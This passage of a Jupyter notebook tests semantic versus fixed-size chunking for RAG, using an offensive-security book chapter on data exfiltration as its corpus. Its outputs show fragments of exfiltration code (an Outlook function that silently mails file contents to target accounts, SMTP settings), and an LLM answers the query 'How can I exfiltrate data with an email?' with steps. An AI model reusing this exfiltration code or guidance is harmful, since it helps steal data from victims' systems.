      "Now let’s write a Windows-specific function to perform the same \n",
      "technique:\n",
      "1 def outlook(subject, contents):\n",
      " 2 outlook = win32com.client.Dispatch(\"Outlook.Application\")\n",
      "    message = outlook.CreateItem(0)\n",
      " 3 message.DeleteAfterSubmit = True\n",
      "    message.Subject = subject\n",
      "    message.Body = contents.decode()\n",
      "    message.To =  tgt_accts[0]\n",
      " 4 message.Send()\n",
      "\n",
      "144   Chapter 9\n",
      "The outlook function takes the same arguments as the plain_email \n",
      "function: subject and conte...\n",
      "--------------------------------------------------\n"
     ]
    }
   ],
   "source": [
    "# Display first few semantic chunks\n",
    "for i, node in enumerate(semantic_nodes[:3]):\n",
    "    print(f\"\\n=== Semantic Chunk {i+1} ===\")\n",
    "    print(f\"Length: {len(node.get_content())} characters\")\n",
    "    print(f\"Content preview: {node.get_content()[:1000]}...\")\n",
    "    print(\"-\" * 50)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c107ebfa",
   "metadata": {},
   "source": [
    "## Comparing with Baseline Chunking\n",
    "\n",
    "Now let's compare the semantic chunks with baseline fixed-size chunks to see the difference in content organization."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "id": "3030722e",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "=== Baseline Chunk 1 ===\n",
      "Length: 2205 characters\n",
      "Content preview: 9\n",
      "FUN WITH EXFILTRATION\n",
      "Gaining access to a target network is only \n",
      "a part of the battle. To make use of your \n",
      "access, you want to be able to exfiltrate \n",
      "documents, spreadsheets, or other bits of data \n",
      "from the target system. Depending on the defense \n",
      "mechanisms in place, this last part of your atta...\n",
      "--------------------------------------------------\n",
      "\n",
      "=== Baseline Chunk 2 ===\n",
      "Length: 2085 characters\n",
      "Content preview: Encrypting and Decrypting Files\n",
      "We’ll use the pycryptodomex package for the encryption tasks. You can install \n",
      "it with this command:\n",
      "$ pip install pycryptodomex\n",
      "Now, open up cryptor.py and let’s import the libraries we’ll need to get \n",
      "started:\n",
      "1 from Cryptodome.Cipher import AES, PKCS1_OAEP\n",
      "2 from C...\n",
      "--------------------------------------------------\n",
      "\n",
      "=== Baseline Chunk 3 ===\n",
      "Length: 2054 characters\n",
      "Content preview: For example, the TLS communication between your \n",
      "browser and a web server involves a hybrid system.\n",
      "\n",
      "Fun with Exfiltration    141\n",
      "Before we can begin encrypting or decrypting, we’ll need to create pub -\n",
      "lic and private keys for the asymmetric RSA encryption. That is, we need to \n",
      "create an RSA key ge...\n",
      "--------------------------------------------------\n"
     ]
    }
   ],
   "source": [
    "# Display first few baseline chunks for comparison\n",
    "for i, node in enumerate(baseline_nodes[:3]):\n",
    "    print(f\"\\n=== Baseline Chunk {i+1} ===\")\n",
    "    print(f\"Length: {len(node.get_content())} characters\")\n",
    "    print(f\"Content preview: {node.get_content()[:300]}...\")\n",
    "    print(\"-\" * 50)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 46,
   "id": "d4aeccb0",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Chunk Size Statistics:\n",
      "Semantic chunks - Min: 13, Max: 8593, Avg: 3307.6\n",
      "Baseline chunks - Min: 943, Max: 2727, Avg: 1921.7\n"
     ]
    }
   ],
   "source": [
    "# Analyze chunk size distribution\n",
    "semantic_sizes = [len(node.get_content()) for node in semantic_nodes]\n",
    "baseline_sizes = [len(node.get_content()) for node in baseline_nodes]\n",
    "\n",
    "print(\"Chunk Size Statistics:\")\n",
    "print(f\"Semantic chunks - Min: {min(semantic_sizes)}, Max: {max(semantic_sizes)}, Avg: {sum(semantic_sizes)/len(semantic_sizes):.1f}\")\n",
    "print(f\"Baseline chunks - Min: {min(baseline_sizes)}, Max: {max(baseline_sizes)}, Avg: {sum(baseline_sizes)/len(baseline_sizes):.1f}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "da913240",
   "metadata": {},
   "source": [
    "## Setting up Query Engines\n",
    "\n",
    "We'll create query engines for both chunking methods to test their effectiveness in retrieving relevant information."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "id": "292fcdd2",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Query engines created successfully!\n"
     ]
    }
   ],
   "source": [
    "from llama_index.core import Settings\n",
    "from llama_index.core.response.notebook_utils import display_source_node\n",
    "\n",
    "# Configure both embedding model and LLM in global settings\n",
    "Settings.embed_model = embed_model\n",
    "\n",
    "llm = AzureOpenAI(\n",
    "    model=\"gpt-4o-mini\",\n",
    "    deployment_name=deployment_name,\n",
    "    api_key=api_key,\n",
    "    azure_endpoint=azure_endpoint,\n",
    "    api_version=api_version,\n",
    "    engine=deployment_name\n",
    ")\n",
    "\n",
    "Settings.llm = llm\n",
    "\n",
    "# Create vector indexes and query engines\n",
    "semantic_index = VectorStoreIndex(semantic_nodes)\n",
    "semantic_query_engine = semantic_index.as_query_engine()\n",
    "\n",
    "baseline_index = VectorStoreIndex(baseline_nodes)\n",
    "baseline_query_engine = baseline_index.as_query_engine()\n",
    "\n",
    "print(\"Query engines created successfully!\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "086bb569",
   "metadata": {},
   "source": [
    "## Testing Queries\n",
    "\n",
    "Let's test both chunking approaches with sample queries to see how they perform."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "id": "071ecdd4",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "=== Semantic Chunking Response ===\n",
      "To exfiltrate data via email, you can use a function that connects to an SMTP server. First, you need to import the necessary libraries, such as `smtplib` for email functionality. Set up the SMTP server details, including the server address, port, account name, and password. \n",
      "\n",
      "You can create a function, such as `plain_email`, which takes the subject and contents of the email as inputs. Inside this function, construct the email message by including the subject, sender, and recipient information. Then, establish a connection to the SMTP server, log in with your credentials, and send the email containing the data you wish to exfiltrate. Finally, ensure to close the connection to the server after sending the email.\n",
      "\n",
      "==================================================\n",
      "=== Baseline Chunking Response ===\n",
      "To exfiltrate data via email, you can use a function that connects to an SMTP server. First, you need to specify the SMTP server details, including the server address, port, account name, and password. Then, create a function that constructs an email message with the subject and contents you want to send. The subject can be the name of the file being exfiltrated, while the contents should be the encrypted data.\n",
      "\n",
      "Once the message is prepared, connect to the SMTP server, log in with your account credentials, and use the sendmail method to send the email to the target accounts. After sending the email, ensure to close the connection to the server. This process allows you to securely send exfiltrated data through email.\n"
     ]
    }
   ],
   "source": [
    "# Test query - modify this based on your document content\n",
    "# test_query = \"What are the main topics discussed in this document?\"\n",
    "test_query = \"How can I exfiltrate data with an email?\"\n",
    "\n",
    "print(\"=== Semantic Chunking Response ===\")\n",
    "semantic_response = semantic_query_engine.query(test_query)\n",
    "print(semantic_response)\n",
    "\n",
    "print(\"\\n\" + \"=\"*50)\n",
    "print(\"=== Baseline Chunking Response ===\")\n",
    "baseline_response = baseline_query_engine.query(test_query)\n",
    "print(baseline_response)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 48,
   "id": "93ac05dd",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "=== Source Nodes (Semantic Chunking) ===\n",
      "\n",
      "Node 1 (Similarity: 0.5509):\n"
     ]
    },
    {
     "data": {
      "text/markdown": [
       "**Node ID:** aea49140-fc08-497b-859b-2e3850391976<br>**Similarity:** 0.5508637623112517<br>**Text:** 150   Chapter 9\n",
       "We pass the exfiltrate function the path to a document and the method \n",
       "of exfiltration we want to use  1. When the method involves a file transfer \n",
       "(transmit or plain_ftp), we need to provide an actual file, not an encoded \n",
       "string. In that case, we read in the file from its source, encrypt the contents, \n",
       "and write a new file into a temporary directory 2. We call the EXFIL diction-\n",
       "ary to dispatch the corresponding method, passing in the new encrypted \n",
       "document path to exfiltra...<br>"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "Node 2 (Similarity: 0.5189):\n"
     ]
    },
    {
     "data": {
      "text/markdown": [
       "**Node ID:** eed97e66-6e2c-490f-b2ac-38a6964935ae<br>**Similarity:** 0.5188609583743866<br>**Text:** Fun with Exfiltration    143\n",
       "2 import win32com.client\n",
       "3 smtp_server = 'smtp.example.com'\n",
       "smtp_port = 587\n",
       "smtp_acct = 'tim@example.com'\n",
       "smtp_password = 'seKret'\n",
       "tgt_accts = ['tim@elsewhere.com']\n",
       "We import smptlib, which we need for the cross-platform email func -\n",
       "tion 1. We’ll use the win32com package to write our Windows-specific \n",
       "function 2. To use the SMTP email client, we need to connect to a Simple \n",
       "Mail Transfer Protocol (SMTP) server (an example might be smtp.gmail.com \n",
       "if you have a Gm...<br>"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Display source nodes for semantic chunking response\n",
    "print(\"=== Source Nodes (Semantic Chunking) ===\")\n",
    "for i, node in enumerate(semantic_response.source_nodes):\n",
    "    print(f\"\\nNode {i+1} (Similarity: {node.score:.4f}):\")\n",
    "    display_source_node(node, source_length=500)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 49,
   "id": "45026f78",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "=== Source Nodes (Baseline Chunking) ===\n",
      "\n",
      "Node 1 (Similarity: 0.5354):\n"
     ]
    },
    {
     "data": {
      "text/markdown": [
       "**Node ID:** 9d9cddaf-3976-4dc5-b7e4-b0e9f297ad4a<br>**Similarity:** 0.5354182524902213<br>**Text:** Fun with Exfiltration    143\n",
       "2 import win32com.client\n",
       "3 smtp_server = 'smtp.example.com'\n",
       "smtp_port = 587\n",
       "smtp_acct = 'tim@example.com'\n",
       "smtp_password = 'seKret'\n",
       "tgt_accts = ['tim@elsewhere.com']\n",
       "We import smptlib, which we need for the cross-platform email func -\n",
       "tion 1. We’ll use the win32com package to write our Windows-specific \n",
       "function 2. To use the SMTP email client, we need to connect to a Simple \n",
       "Mail Transfer Protocol (SMTP) server (an example might be smtp.gmail.com \n",
       "if you have a Gm...<br>"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "Node 2 (Similarity: 0.5150):\n"
     ]
    },
    {
     "data": {
      "text/markdown": [
       "**Node ID:** ee793005-ee46-402b-b767-295717e50468<br>**Similarity:** 0.514965630715785<br>**Text:** 150   Chapter 9\n",
       "We pass the exfiltrate function the path to a document and the method \n",
       "of exfiltration we want to use  1. When the method involves a file transfer \n",
       "(transmit or plain_ftp), we need to provide an actual file, not an encoded \n",
       "string. In that case, we read in the file from its source, encrypt the contents, \n",
       "and write a new file into a temporary directory 2. We call the EXFIL diction-\n",
       "ary to dispatch the corresponding method, passing in the new encrypted \n",
       "document path to exfiltra...<br>"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Display source nodes for baseline chunking response\n",
    "print(\"=== Source Nodes (Baseline Chunking) ===\")\n",
    "for i, node in enumerate(baseline_response.source_nodes):\n",
    "    print(f\"\\nNode {i+1} (Similarity: {node.score:.4f}):\")\n",
    "    display_source_node(node, source_length=500)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "addb13d2",
   "metadata": {},
   "source": [
    "## Advanced Configuration\n",
    "\n",
    "You can fine-tune the semantic splitter parameters for better results:\n",
    "\n",
    "- `buffer_size`: Number of sentences to group when evaluating similarity\n",
    "- `breakpoint_percentile_threshold`: Higher values create larger, more cohesive chunks\n",
    "- `embed_model`: Different embedding models may produce different chunking results"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9ad50e8d",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Example of fine-tuning semantic splitter parameters\n",
    "fine_tuned_splitter = SemanticSplitterNodeParser(\n",
    "    buffer_size=2,  # Group 2 sentences at a time\n",
    "    breakpoint_percentile_threshold=90,  # Lower threshold for more granular chunks\n",
    "    embed_model=embed_model\n",
    ")\n",
    "\n",
    "# Generate chunks with fine-tuned parameters\n",
    "fine_tuned_nodes = fine_tuned_splitter.get_nodes_from_documents(documents)\n",
    "\n",
    "print(f\"Fine-tuned semantic chunking produced {len(fine_tuned_nodes)} chunks\")\n",
    "print(f\"Original semantic chunking produced {len(semantic_nodes)} chunks\")\n",
    "print(f\"Baseline chunking produced {len(baseline_nodes)} chunks\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1dd51ec4",
   "metadata": {},
   "source": [
    "## Summary\n",
    "\n",
    "Semantic chunking offers several advantages over fixed-size chunking:\n",
    "\n",
    "1. **Content Coherence**: Chunks contain semantically related sentences\n",
    "2. **Adaptive Size**: Chunk sizes vary based on content structure\n",
    "3. **Better Retrieval**: More relevant chunks for specific queries\n",
    "4. **Context Preservation**: Related information stays together\n",
    "\n",
    "Use semantic chunking when you need more intelligent document segmentation for RAG applications."
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "ainotebooks",
   "language": "python",
   "name": "ainotebooks"
  },
  "language_info": {
   "name": "python",
   "version": "3.12.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
